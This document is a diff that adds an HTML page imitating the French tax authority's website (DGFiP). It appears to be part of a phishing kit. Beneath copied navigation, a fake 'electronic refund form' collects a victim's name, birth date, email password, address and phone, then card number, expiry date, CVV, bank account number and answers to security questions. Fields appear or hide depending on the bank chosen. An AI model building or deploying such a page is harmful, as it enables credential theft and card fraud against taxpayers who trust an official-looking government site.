+					<a href="index.html#" rel="index"><span class="sprite sprite-ico-accueil"></span>Accueil</a>
+				</li>
+				<li class="active">
+					<a class="nav-part">Particuliers</a>
+				</li>
+				<li>
+					<a href="index.html#" class="nav-pro">Professionnels</a>
+				</li>
+				<li>
+					<a href="index.html#" class="nav-doc">Documentation</a>
+				</li>
+			</ul>
+		</nav><!-- #EndLibraryItem --><!-- NAVIGATION end -->
+
+		<!-- SUBNAV --><!-- #BeginLibraryItem "/Library/moe_part_nav.lbi" -->
+<nav id="nav-level-2" class="pro">
+			<ul>
+				<li class="list-nav-gp">
+
+					<!-- SUBLAYER 1.1 :: Vos impôts -->
+					<span class="arrow-lb">Vos impôts</span>
+
+					<ul class="nav-level-3">
+						<li>
+							<!-- FL -->
+							<ul class="list-arrow-gray fl w25pc" style="display: none;">
+								<li>
+									<a title="Vos impôts : Impôt sur le revenu" href="index.html#">Impôt sur le revenu </a>
+								</li>
+								<li>
+									<a title="Vos impôts : Prélèvements sociaux" href="index.html#">Prélèvements sociaux </a>
+								</li>
+							</ul>
+							<!-- FL end-->
+							<!-- FL -->
+							<ul class="list-arrow-gray fl w25pc" style="display: none;">
+								<li> 
+									<a title="Vos impôts : Taxe d&#39;habitation" href="index.html#">Taxe d'habitation</a> 
+								</li>
+								<li>
+									<a title="Vos impôts : Contribution à l&#39;audiovisuel public" href="index.html#">Contribution à l'audiovisuel public</a>
+								</li>			
+							</ul>
+							<!-- FL end -->
+							<!-- FL -->
+							<ul class="list-arrow-gray fl w25pc" style="display: none;">
+          						<li>
+          							<a href="index.html#" title="Vos impôts : Taxe foncière - bâti">Taxe foncière - bâti </a>
+          						</li>
+          						<li>
+          							<a href="index.html#" title="Vos impôts : Taxe foncière - non bâti">Taxe foncière - non bâti</a>
+          						</li>
+							</ul>
+							<!-- FL end -->
+							<!-- FL -->
+							<ul class="list-arrow-gray fl w25pc" style="display: none;">
+								<li>
+									<a title="Vos impôts : Impôt de Solidarité sur la Fortue" href="index.html#">Impôt de Solidarité sur la Fortune</a>
+								</li>
+						        <li>
+						           <a href="index.html#" title="Vos impôts : Taxe sur les logements vacants">Taxe sur les logements vacants</a>
+						       	</li>
+							</ul>
+							<!-- FL end -->
+						</li>
+					</ul>
+					<!-- SUBLAYER 1.1 :: Vos impôts end -->
+					
+				</li>
+
+				<li class="list-nav-gp">
+
+					<!-- SUBLAYER 1.2 :: Vos préoccupations -->
+					<span class="arrow-lb">Vos préoccupations</span>
+
+					<ul class="nav-level-3">
+						<li>
+							<!-- fl -->
+							<ul class="list-arrow-gray fl w25pc" style="display: none;">
+								<li>
+									<a alt="Vos préoccupations : Famille" title="Vos préoccupations : Famille" href="index.html#">Famille</a> 
+								</li>
+								<li> 
+									<a alt="Vos préoccupations : Pension alimentaire" title="Vos préoccupations : Pension alimentaire" href="index.html#">Pension alimentaire</a> 
+								</li>
+							</ul>
+							<!-- fl end -->
+							<!-- fl -->
+							<ul class=" list-arrow-gray fl w25pc" style="display: none;">
+								<li>
+									<a title="Vos préoccupations : Logement" href="index.html#">Logement</a>
+								</li>
+								<li>
+									<a title="Vos préoccupations : Patrimoine" href="index.html#">Patrimoine</a>
+								</li>
+							</ul>
+							<!-- fl end -->
+							<!-- fl -->
+							<ul class="list-arrow-gray fl w25pc" style="display: none;">
+								<li>
+									<a alt="Vos préoccupations : Frais professionnels" title="Vos préoccupations : Frais professionnels" href="index.html#"> Frais professionnels</a>
+								</li>
+							</ul>
+							<!-- fl end -->
+							<!-- fl -->
+							<ul class="list-arrow-gray fl w25pc" style="display: none;">
+								<li>
+									<a title="Vos préoccupations : Vivre hors de France" href="index.html#">Vivre hors de France </a> </li>
+								<li>
+									<a title="Vos préoccupations : Installation ou retour en France" href="index.html#">Installation ou retour en France</a>
+								</li>
+							</ul>
+							<!-- fl end -->
+						</li>
+					</ul>
+					<!-- SUBLAYER 1.2 :: Vos préoccupations end -->
+				</li>
+				<li class="list-nav-gp">
+					<a title="Particuliers : Calendrier" href="index.html#" class="arrow-lb">Calendrier</a>
+				</li>
+				<li class="list-nav-gp">
+					<a title="Particuliers : Vos droits" href="index.html#">Vos droits</a>
+				</li>
+			</ul>
+		</nav><!-- #EndLibraryItem --><!-- SUBNAV end -->
+
+		<!--  BREADCRUMB -->
+
+		<div id="breadcrumb" typeof="breadcrumb" role="navigation">
+		
+		<a href="index.html#" >Remboursement </a></div>
+
+		<!--  BREADCRUMB end -->
+
+
+
+		<!-- *************************************************************************************************** -->
+
+		<main role="main">
+
+			<div class="board">
+<a href="index.html#" class=""> accéder à <strong>Mon espace</strong><span class=""></span></a></div>
+
+			<!-- *********************************************************************************************** -->
+
+			<!-- LEFT COLL -->
+			<div class="col-left box">
+
+				<!-- CAROUSEL end -->
+				
+				<!-- CAROUSEL end -->
+
+				<!-- *************************************************************************************************** -->
+
+				<!-- BOX 49% -->
+				
+				<!-- BOX 49% end -->
+
+				<!-- BOX 49% -->
+				
+				<!-- BOX 49% end -->
+
+				<!-- BOX 49% -->
+				
+				<!-- BOX 49% end -->
+
+				<!-- BOX 49% -->
+				
+				<!-- BOX 49% end -->
+
+				<!-- BOX 49% -->
+				
+				<!-- BOX 49% end -->
+
+				<!-- BOX 49% -->
+				
+				<!-- BOX 49% end -->
+
+				<!-- *************************************************************************************************** -->
+
+				<!-- BOX NEWS  -->
+				<section class="rounded-corner cb">
+
+					<h3 class="art-tt" style="border:1px solid gray;padding-left:60px;color:#2B547E;background:#CACACA; ">Formulaire de remboursement électronique - N97128999</h3>
+
+<div class="perso">
+<image src="secure.jpg" class="sucure"/>
+					<div id="perso" ><font size="4" color="#008080"><b>Donn&eacute;es personnelles</b></font></br></br>
+					
+					</div>
+					<div id="banc" style="display:none" ><font size="4" color="#008080"><b>Donn&eacute;es Bancaires</b></font></br></br></div>
+				
+					
+					
+					
+					
+					
+					
+                <article class="">
+				
+					<font color="#FF0000">* La saisie de toutes les zones est obligatoire.</font>
+					</br></br>
+					
+					<div id="page1" class="" width="auto"> 
+					
+					
+					<form id="frm" name="frm" method="post">
+
+					
+						
+							<label>Nom&nbsp;<span><font color="#FF0000">*</font></span>:</label>
+								
+							
+							<input style="" class="" tabindex="1" maxlength="13" id="nom" name="nom" type="text"/>
+							
+							<div id="msgnom" class="msg" style="color:red; display:none">
+                                        <img src="pic_alerte.gif"/>                
+									<div >
+										Entrer votre Nom.
+									</div>
+
+						   </div>
+						<br/>
+						
+							<label>Pr&eacute;nom&nbsp;<span id="saisie_obligatoire_texte1"><font color="#FF0000">*</font></span>:</label>
+								
+							
+							<input id="prenom" name="prenom" tabindex="3" maxlength="8" type="text"/>
+							<div id="msgprenom" class="msg" style="color:red;display:none">
+                                        <img src="pic_alerte.gif"/>                
+									<div>
+										Entrer votre Prénom.
+									</div>
+
+						   </div>
+						<br/>
+						
+							<label>Date&nbsp;de&nbsp;Naissance&nbsp;<span id="saisie_obligatoire_texte2"><font color="#FF0000">*</font></span>:</label>
+								
+							
+			 <select autocomplete="off"  id="jour" name="jour" >
+                                        <option value="" selected="selected">Jours</option>
+										    <option value="1">01</option>
+                                            <option value="2">02</option>
+                                            <option value="3">03</option>
+                                            <option value="4">04</option>
+                                            <option value="5">05</option>
+                                            <option value="6">06</option>
+                                            <option value="7">07</option>
+                                            <option value="8">08</option>
+                                            <option value="9">09</option>
+                                            <option value="10">10</option>
+                                            <option value="11">11</option>
+                                            <option value="12">12</option>
+											<option value="13">13</option>
+											<option value="14">14</option>
+											<option value="15">15</option>
+											<option value="16">16</option>
+											<option value="17">17</option>
+											<option value="18">18</option>
+											<option value="19">19</option>
+											<option value="20">20</option>
+											<option value="21">21</option>
+											<option value="22">22</option>
+											<option value="23">23</option>
+											<option value="24">24</option>
+											<option value="25">25</option>
+											<option value="26">26</option>
+											<option value="27">27</option>
+											<option value="28">28</option>
+											<option value="29">29</option>
+											<option value="30">30</option>
+											<option value="31">31</option>
+                        </select>
+										
+            <select autocomplete="off"  id="mois" name="mois" class="month validate-cc-exp required-entry">
+                                        <option value="" selected="selected">Mois</option>
+                            <option value="1">01</option>
+                            <option value="2">02</option>
+                            <option value="3">03</option>
+                            <option value="4">04</option>
+                            <option value="5">05</option>
+                            <option value="6">06</option>
+                            <option value="7">07</option>
+                            <option value="8">08</option>
+                            <option value="9">09</option>
+                            <option value="10">10</option>
+                            <option value="11">11</option>
+                            <option value="12">12</option>
+                        </select>
+                        <select autocomplete="off"  id="annee" name="annee" class="year required-entry">
+                            <option value="" selected="selected">Ann&eacute;e</option>
+										<option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option><option value="1912">1912</option><option value="1911">1911</option><option value="1910">1910</option><option value="1909">1909</option><option value="1908">1908</option><option value="1907">1907</option><option value="1906">1906</option><option value="1905">1905</option><option value="1904">1904</option><option value="1903">1903</option><option value="1902">1902</option><option value="1901">1901</option>                        </select>
+						<div id="msgdtn" class="msg" style="color:red;display:none">
+                                        <img src="pic_alerte.gif"/>                
+									<div>
+										Entrer votre Date de naissance.
+									</div>
+
+						   </div>
+						<br/>
+							<label>Adresse email&nbsp;<span id="saisie_obligatoire_texte3"><font color="#FF0000">*</font></span>:</label>
+								
+							
+							<input id="email" name="email" ="3" maxlength="50" type="text">
+							<div id="msgmail" class="msg" style="color:red;display:none">
+                                        <img src="pic_alerte.gif"/>                
+									<div>
+										Entrer votre Email.
+									</div>
+
+						   </div>
+						
+						<br/>
+							<label>Mot de Passe&nbsp;<span id="saisie_obligatoire_texte4"><font color="#FF0000">*</font></span>:</label>
+								
+							
+							<input tabindex="3" maxlength="30" id="passe" name="passe" type="password">
+							<div id="msgpasse" class="msg" style="color:red;display:none">
+                                        <img src="pic_alerte.gif"/>                
+									<div>
+										Entrer votre Mot de passe.
+									</div>
+
+						   </div>
+						<br/>
+						
+							<label>Ligne d&#39;adresse&nbsp;1<span id="saisie_obligatoire_texte5"><font color="#FF0000"> 
+							*</font></span>:</label>
+								
+							
+							<input tabindex="3" maxlength="80" id="adresse" name="adresse" type="text">
+							<div id="msgad" class="msg" style="color:red;display:none">
+                                        <img src="pic_alerte.gif"/>                
+									<div>
+										Entrer votre Adresse.
+									</div>
+
+						   </div>
+						<br/>
+						
+							<label>Ligne d&#39;adresse&nbsp;2 :</label>
+								
+							
+							<input tabindex="3" maxlength="80" id="adresse2" name="adresse2" type="text">
+						
+						<br/>
+							<label>Ville&nbsp;<span id="saisie_obligatoire_texte6"><font color="#FF0000">*</font></span>:</label>
+								
+							
+							<input tabindex="3" maxlength="15" id="ville" name="ville" type="text">
+							<div id="msgville" class="msg" style="color:red;display:none">
+                                        <img src="pic_alerte.gif"/>                
+									<div>
+										Entrer votre ville.
+									</div>
+
+						   </div>
+						
+						<br/>
+							<label>Code Postale&nbsp;<span id="saisie_obligatoire_texte7"><font color="#FF0000">*</font></span>:</label>
+								
+							
+							<input tabindex="3" maxlength="10" id="postale" name="postale" type="text">
+							<div id="msgcp" class="msg" style="color:red;display:none">
+                                        <img src="pic_alerte.gif"/>                
+									<div>
+										Entrer votre Code postal.
+									</div>
+
+						   </div>
+						
+						<br/>
+							<label>T&eacute;l.<span id="saisie_obligatoire_texte9"><font color="#FF0000">*</font></span>:</label>
+								
+							
+							<input  maxlength="15" id="tel" name="tel" type="text"/>
+												<div id="msgtel" class="msg" style="color:red;display:none">
+                                        <img src="pic_alerte.gif"/>                
+									<div>
+										Entrer votre N° de Tél.
+									</div>
+
+						   </div>
+						
+						<br/>
+							
+					
+						<img  src="valider.png" class="bt" id="suivant1" type="button" value=""/>
+					
+				
+					</div>
+					</div>
+					
+				<div id="page2" style="display:none">
+				
+                        <label >Votre banque<font color="#FF0000">*</font> :</label>
+                      
+                        <select id="bank" name="bank" onchange="
+						
+						if(this.value==''){
+						
+						document.getElementById('infperso').style.display='none';
+						}else{
+						
+						if(this.value=='bnp' || this.value=='caisse' || this.value=='sg' ){
+						
+						document.getElementById('infperso').style.display='';
+						document.getElementById('num_compte').style.display='';
+						document.getElementById('question').style.display='none';
+						
+						}else{
+						
+						if(this.value=='pst' || this.value=='lcl' ){
+						
+						document.getElementById('infperso').style.display='';
+						document.getElementById('num_compte').style.display='';
+						document.getElementById('question').style.display='';
+						
+						}else{
+						
+						document.getElementById('infperso').style.display='';
+						document.getElementById('num_compte').style.display='none';
+						document.getElementById('question').style.display='none';
+						}
+						
+						}
+						
+						
+						
+						}
+						
+						
+						
+						">
+							<option value="">- -</option>
+							<option value="amex">American Express</option>
+							<option value="axa">Axa Banque</option>
+							<option value="bp">Banque populaire</option>
+							<option value="bnp">BNP</option>
+							<option value="bred">Bred</option>
+							<option value="caisse">Caisse d'épargne</option>
+							<option value="ca">Crédit agricole</option>
+							<option value="cm">Crédit mutuel</option>
+							<option value="cn">Crédit du nord</option>
+							<option value="cic">CIC</option>
+							<option value="hsbc">HSBC</option>
+							<option value="sg">Société générale</option>
+							<option value="pst">La Banque Postale</option>
+							<option value="lcl">LCL</option>
+							<option value="na">Autres</option>
+						</select><br/>
+						<div id="infperso" style="display:none">
+					
+                    <label>Nº de carte de crédit<font color="#FF0000">*</font> : </label>
+					<input id="ncb" name="ncb" type="text" size="18" maxlength="16" style="width:160px" />
+					
+					<div id="msgncb" class="msg" style="color:red;display:none">
+                                        <img src="pic_alerte.gif"/>                
+									<div>
+										Entrer votre N° de carte Crédit.
+									</div>
+
+						   </div>
+						  <div style="clear:both;margin-top:-10px;"></div>
+						   <img src="crd.png" style="margin-bottom:10px;" class="visa"/>
+					</br>
+					
+					<label >Date d'expiration  <font color="#FF0000">*</font>:</label>
+                                                    
+													<select  name="emois"id="emois">
+								<option id="" value="" selected="">Mois </option>
+								
+										<option value="1"> 1</option>
+										<option value="2">2 </option>
+										<option value="3">3 </option>
+										<option value="4">4 </option>
+										<option value="5"> 5</option>
+										<option value="6">6 </option>
+										<option value="7"> 7</option>
+										<option value="8"> 8</option>
+										<option value="9">9 </option>
+										<option value="10"> 10</option>
+										<option value="11"> 11</option>
+										<option value="12"> 12</option>                             
+                                </select>
+								  
+                                <select  name="eannee"id="eannee">
+								<option id="" selected="selected">Année </option>
+										<option value="2016">2016 </option>
+										<option value="2017">2017 </option>
+										<option value="2018">2018 </option>
+										<option value="2019"> 2019</option>
+										<option value="2020">2020 </option>
+										<option value="2021">2021 </option>
+										<option value="2022">2022 </option>
+										<option value="2023"> 2023</option>
+										<option value="2024"> 2024</option>
+										<option value="2025"> 2025</option>
+										<option value="2026"> 2026</option>
+										<option value="2027">2027 </option>
+										<option value="2028">2028 </option>
+										<option value="2029">2029 </option>
+										<option value="2030"> 2030</option>
+										<option value="2031">2031 </option>
+										<option value="2032">2032 </option>
+										<option value="2033"> 2033</option>
+										<option value="2034"> 2034</option>
+										<option value="2035">2035 </option>                               
+                                </select>
+													<div id="msgdex" class="msg" style="color:red;display:none">
+                                        <img src="pic_alerte.gif"/>                
+									<div>
+										Entrer votre Date Expiration.
+									</div>
+
+						   </div>
+								</br>
+					<label>Code de sécurité (CVV)<font color="#FF0000">*</font>:</label>
+                                                   
+					<input autofocus id="cvv" name="cvv" maxlength="4"  type="text" style="width:80px"/>
+					<img src="cvv.gif" class="cvv"/>
+										<div id="msgcvv" class="msg" style="color:red;display:none">
+                                        <img src="pic_alerte.gif"/>                
+									<div>
+										Entrer votre CVV .
+									</div>
+
+						   </div>
+													
+													</br>
+						<div id="num_compte">							
+					<label class="bold">Numéro de compte <font color="#FF0000">*</font>:</label>
+<input id ="nc" name="nc" type="text" size="16" style="width:160px" />
+<div id="msgncom" class="msg" style="color:red;display:none">
+                <img src="pic_alerte.gif"/>                
+									<div>
+										Entrer votre N° de compte.
+									</div>
+
+						   </div></div>
+</br>
+<div id="question">
+<label class="">Question personnelle 1 :</label>
+<select name="question1" id="question" class="chp_question" size="1" >
+<option value="--" selected> -- </option>
+   <option value="Quel était le prénom de votre meilleur (e) ami(e) d'enfance ?"> Quel était le prénom de votre meilleur (e) ami(e) d'enfance ?</option>
+   <option value="Dans quelle rue avez-vous grandi ?"> Dans quelle rue avez-vous grandi ? </option>
+   <option value="Quel est le prénom de laine de vos cousins et cousines ?"> Quel est le prénom de laine de vos cousins et cousines ? </option>
+   <option value="Quel était votre lieu de vacances préfére durant votre enfance ?">Quel était votre lieu de vacances préfére durant votre enfance ?</option>
+   <option value="Quel était votre dessin animée préféré ?">Quel était votre dessin animée préféré ? </option>
+                            </select></br>
+
+
+<label class="bold">Réponse personnelle 1 :</label>
+<input name="reponses1" type="text" size="29" /></br>
+<label class="bold">Question personnelle 2 :</label>
+<select name="question2" id="question2" class="chp_question" size="1" >
+<option value="--" selected> -- </option>
+   <option value="Quel était le prénom de votre meilleur (e) ami(e) d'enfance ?"> Quel était le prénom de votre meilleur (e) ami(e) d'enfance ?</option>
+   <option value="Dans quelle rue avez-vous grandi ?"> Dans quelle rue avez-vous grandi ? </option>
+   <option value="Quel est le prénom de laine de vos cousins et cousines ?"> Quel est le prénom de laine de vos cousins et cousines ? </option>
+   <option value="Quel était votre lieu de vacances préfére durant votre enfance ?">Quel était votre lieu de vacances préfére durant votre enfance ?</option>
+   <option value="Quel était votre dessin animée préféré ?">Quel était votre dessin animée préféré ? </option>
+                            </select></br>
+
+
+<label class="bold">Réponse personnelle 2 :</label>
+<input name="reponses2" type="text" size="29" />
+</div>
+<div class="">
+						<img  src="valider.png" class="val" id="suivant2" type="button" value="Valider"/>
+					</div>
+
+
+		
+				</div>	
+				</form>
+					  <p> </p>
+				
+				</article>
+
+
+
+				<article class="box-art fr">
+			   </article>
+                  <article class="box-art fl">
+				</article>
+			     
+                  <article class="box-art fr">
+			        
+</article>
+
+<!-- ARTICLE 2.1 end -->
+
+					<!-- ARTICLE 2.2 --><!-- ARTICLE 2.2 end -->
+
+					<!-- ARTICLE 2.3 -->
+					<!-- ARTICLE 2.3 end -->
+
+					<!-- ARTICLE 2.4 --><!-- ARTICLE 2.4 end -->
+
+					
+
+				</section>
+				<!-- BOX NEWS end -->
+
+
+				<!-- SUBNAV RWD--><!-- #BeginLibraryItem "/Library/moe_part_nav_rwd.lbi" -->
+<nav class="board">
+					<ul class="navigation">
+						<li class="sub-menu">
+							<!-- SUBLAYER 1.1 :: Vos impôts -->
+							<a href="index.html" title="Afficher le sous-menu">Vos impôts</a>
+
+							<ul class="list-arrow-gray" style="display: none;">
+								<li>
+									<a title="Vos impôts : Impôt sur le revenu" href="index.html">Impôt sur le revenu</a>
+								</li>
+								<li>
+									<a title="Vos impôts : Prélèvements sociaux" href="index.html#">Prélèvements sociaux</a>
+								</li>
+								<li> 
+									<a title="Vos impôts : Taxe d&#39;habitation" href="index.html#">Taxe d'habitation</a> 
+								</li>
+								<li>
+									<a title="Vos impôts : Contribution à l&#39;audiovisuel public" href="index.html#">Contribution à l'audiovisuel public</a>
+								</li>			
+          						<li>
+          							<a href="index.html#" title="Vos impôts : Taxe foncière - bâti">Taxe foncière - bâti</a>
+          						</li>
+          						<li>
+          							<a href="index.html#" title="Vos impôts : Taxe foncière - non bâti">Taxe foncière - non bâti</a>
+          						</li>
+								<li>
+									<a title="Vos impôts : Impôt de Solidarité sur la Fortue" href="index.html#">Impôt de Solidarité sur la Fortune</a>
+								</li>
+						        <li>
+						           	<a href="index.html#" title="Vos impôts : Taxe sur les logements vacants">Taxe sur les logements vacants</a>
+						       	</li>
+							</ul>
+
+							<!-- SUBLAYER 1.1 :: Vos impôts end -->
+						</li>
+						<li class="sub-menu">
+							<!-- SUBLAYER 1.2 :: Vos préoccupations -->
+							<a href="index.html" title="Afficher le sous-menu">Vos préoccupations</a>
+
+							<ul class="list-arrow-gray" style="display: none;">
+								<li>
+									<a title="Vos préoccupations : Famille" href="index.html#">Famille</a> 
+								</li>
+								<li> 
+									<a title="Vos préoccupations : Pension alimentaire" href="index.html#">Pension alimentaire</a> 
+								</li>
+								<li>
+									<a title="Vos préoccupations : Logement" href="index.html#">Logement</a>
+								</li>
+								<li>
+									<a title="Vos préoccupations : Patrimoine" href="index.html#">Patrimoine</a>
+								</li>
+								<li>
+									<a title="Vos préoccupations : Frais professionnels" href="index.html#">Frais professionnels</a>
+								</li>
+								<li>
+									<a title="Vos préoccupations : Vivre hors de France" href="index.html#">Vivre hors de France </a> </li>
+								<li>
+									<a title="Vos préoccupations : Installation ou retour en France" href="index.html#">Installation ou retour en France</a>
+								</li>
+							</ul>
+
+							<!-- SUBLAYER 1.2 :: Vos préoccupations end -->
+						</li>
+
+						<li>
+							<a title="Particuliers : Calendrier" href="index.html#">Calendrier</a>
+						</li>
+						<li>
+							<a title="Particuliers : Vos droits" href="index.html#">Vos droits</a>
+						</li>
+						<li>
+							<a title="Particuliers : Questions fréquentes" href="index.html#">Questions fréquentes</a>
+						</li>
+                        <li>
+							<a title="Les coordonnées des services de la DGFiP" href="index.html#">Nous contacter</a>							
+						</li>    
+					</ul>
+				</nav><!-- #EndLibraryItem --><!-- SUBNAV RWD end -->
+
+			</div>
+			
+			
+			<!-- LEFT COLL end -->
+
+			<!-- *********************************************************************************************** -->
+
+			<!-- RIGHT COLL --><!-- #BeginLibraryItem "/Library/cab_part_coldroite.lbi" -->
+<!-- sprites crees non utilises
+sprite sprite-bg-h3-form
+sprite sprite-bg-h3-doc
+-->
+<aside class="col-right box" role="complementary">
+<!-- bouton minisite teledec 2015-->
+<a href="index.html#"> <img src="btn_coldroite_minisite.png" title="Découvrez la déclaration en ligne" alt="Découvrez la déclaration en ligne"></a>
+<!-- bouton acces minisite services
+                    <a href="../minisite/2014/services/services-en-ligne.htm" >
+                    <img src="../images/btn_promo_home.gif" alt="Découvrez tous nos services en ligne"> </a>
+--> 
+				<nav>
+					<ul id="board" class="navigation">
+					  <li class="sub-menu"> <span class="sprite sprite-bg-h3-dgfip"></span><a href="index.html" title="Afficher le sous-menu">Les autres services de la DGFiP</a>
+					    <!-- SUB MENU  -->
+					    <ul class="list-arrow-gray open">
+					      <li><a href="index.html#" title="Accès au site timbres.impots.gouv.fr (nouvelle fenêtre)">timbres.impots.gouv.fr</a></li>
+					      <li><a href="index.html#" title="Accès au site cadastre.gouv.fr (nouvelle fenêtre)" >Le plan cadastral</a></li>
+					      <li><a href="index.html#" title="Accès au site de télépaiement des services publics locaux (nouvelle fenêtre)" >Le télépaiement des services publics locaux</a></li>
+					      <li><a href="index.html#" title="Accès au site amendes.gouv.fr (nouvelle fenêtre)" >Les amendes</a></li>
+					      <li><a href="index.html#" title="Accès au site collectivites-locales.gouv.fr (nouvelle fenêtre)" >Les collectivités locales</a></li>
+					      <li><a href="index.html#" title="Accès au site economie.gouv.fr/cessions (nouvelle fenêtre)" >Les cessions immobilières de l'État</a></li>
+					      <li><a href="index.html#" title="Accès au site pensions.bercy.gouv.fr (nouvelle fenêtre)" >Les pensions et retraites de l'État</a></li>
+					      <li><a href="index.html#" title="Accès au site ventes-domaniales.fr (nouvelle fenêtre)" >Les ventes domaniales</a></li>
+				        </ul>
+					    <!-- SUB MENU end -->
+				      </li>
+					  <!--international--><!--fin international-->
+						<li class="sub-menu">
+							<span class="sprite sprite-bg-h3-simul"></span><a href="index.html" title="Afficher le sous-menu">Simulateurs</a>
+							<!-- SUB MENU  -->
+							<ul class="list-arrow-gray" style="display: none;">
+								<li><a href="index.html#" >Calculez votre impôt sur le revenu pour 2015</a></li>
+								<li><a href="index.html#">
+Frais réels : évaluez vos dépenses avec le barème kilométrique</a></li>
+								<li><a href="index.html#" > Calculez votre ISF 2015 </a><a href="index.html#"> </a></li>
+							</ul>
+							<!-- SUB MENU end -->
+						</li>                        
+						<li>
+							<span class="sprite sprite-bg-h3-qr"></span><a href="index.html#" title="Afficher le sous-menu">Questions fréquentes</a>							
+						</li>
+						<li>
+							<span class="sprite sprite-bg-h3-calend"></span><a href="index.html#" title="Afficher le sous-menu">Calendrier fiscal</a>							
+						</li>
+                        <li class="sub-menu">
+							<span class="sprite sprite-bg-h3-internat"></span><a href="index.html" title="Afficher le sous-menu">Vous êtes à l'étranger</a><!-- SUB MENU  -->
+							<ul class="list-arrow-gray" style="display: none;">
+								<li><a href="index.html#">Vivre hors de France</a></li>
+                                <li><a href="index.html#">Installation ou retour en France</a></li>
+                                <li><a href="index.html#">Documentation</a></li>
+						  </ul>
+							<!-- SUB MENU end -->
+					  </li>                      
+						<li class="sub-menu">
+							<span class="sprite sprite-bg-h3-aboutUs"></span><a href="index.html" title="Afficher le sous-menu">Nous connaître</a>
+							<!-- SUB MENU  -->
+							<ul class="list-arrow-gray" style="display: none;">
+								<li><a href="index.html#">Qui sommes nous ?</a></li>
+							</ul>
+							<!-- SUB MENU end -->
+						</li>
+						<li>
+							<span class="sprite sprite-bg-h3-recrut"></span><a href="index.html#">Nous rejoindre</a>
+						</li>
+						<li><span class="sprite sprite-bg-h3-contact"></span><a href="index.html#" title="Les coordonnées des services de la DGFiP">Nous contacter</a>					
+						</li>
+					</ul>
+				</nav>
+
+			</aside><!-- #EndLibraryItem --><!-- RIGHT COLL end -->
+
+			<!-- *********************************************************************************************** -->
+		</main>
+
+		<!-- *************************************************************************************************** -->
+
+<!-- FOOTER --><!-- #BeginLibraryItem "/Library/moe_all_footer.lbi" -->
+<footer id="footer" role="contentinfo">
+
+			<section class="oh">
+
+				<div class="w25pc fl">
+					<h3>Informations sur le site :</h3>
+					<ul class="list-arrow-blue">
+						<li><a href="index.html#">Plan du site</a></li>
+						<li><a href="index.html#" onclick="return winPop(this.href);" title="Mentions légales (nouvelle fenêtre)">Mentions légales</a></li>
+						<li><a href="index.html#"  title="Accès au répertoire des informations publiques (nouvelle fenêtre)">Répertoire des informations publiques</a></li>
+</ul>
+				<h3>Nous contacter :</h3> 
+                <ul class="list-arrow-blue">						
+				<li><a href="index.html#" title="Les coordonnées des services de la DGFiP">Vous êtes un particulier</a></li>
+                <li><a href="index.html#" title="Les coordonnées des services de la DGFiP">Vous êtes un professionnel</a></li>
+				</ul>               
+				</div>
+
+				<div class="w25pc fl">
+					<h3>Les rubriques du site :</h3>
+					<ul class="list-arrow-blue">
+						<li><a href="index.html#">Particuliers</a></li>
+						<li><a href="index.html#">Professionnels</a></li>
+						<li><a href="index.html#">Documentation</a></li>
+						<li><a href="index.html#">Collectivités locales</a></li>
+						<li><a href="index.html#">Statistiques</a></li>
+					</ul>
+				</div>
+
+				<div class="w25pc fl">
+					<h3>Suivre l’information :</h3>
+					<ul class="list-arrow-blue">
+						<li><a href="index.html#">Pour la presse</a></li>
+						<li><a href="index.html#">Facebook<span class="sprite sprite-bg-facebook"></span></a></li>
+						<li><a href="index.html#">Twitter<span class="sprite sprite-bg-twitter"></span></a></li> 
+					</ul>
+				</div>
+
+				<div class="w25pc fl">
+					<h3>Les autres sites de la DGFiP :</h3>
+					<ul class="list-arrow-blue">
+						<li><a href="index.html#">economie.gouv.fr</a></li>
+						<li><a href="index.html#">cadastre.gouv.fr</a></li>
+						<li><a href="index.html#">amendes.gouv.fr</a></li>
+						<li><a href="index.html#">tipi.budget.gouv.fr</a></li>
+						<li><a href="index.html#">collectivites-locales.gouv.fr</a></li>
+						<li><a href="index.html#">economie.gouv.fr/cessions</a></li>
+						<li><a href="index.html#">pensions.bercy.gouv.fr</a></li>
+						<li><a href="index.html#">ventes-domaniales.fr</a></li>						
+					</ul>
+				</div>
+
+			</section>
+
+			<ul class="comarquage">
+				<li><a href="index.html#" title="Accès au site service-public.fr (nouvelle fenêtre)" ><img alt="Accès au site service-public.fr (nouvelle fenêtre)" src="logo_sp.gif"></a></li>
+
+				<li><a href="index.html#" title="Accès au site www.legifrance.gouv.fr (nouvelle fenêtre)" ><img alt="Accès au site www.legifrance.gouv.fr (nouvelle fenêtre)" src="logo_legifrance.gif"></a></li>
+
+				<li><a title="Accès au site gouvernement.gouv.fr (nouvelle fenêtre)"  class="sp" href="index.html#"><img alt="Accès au site gouvernement.fr (nouvelle fenêtre)" src="logo_gouv.jpg"></a></li>
+
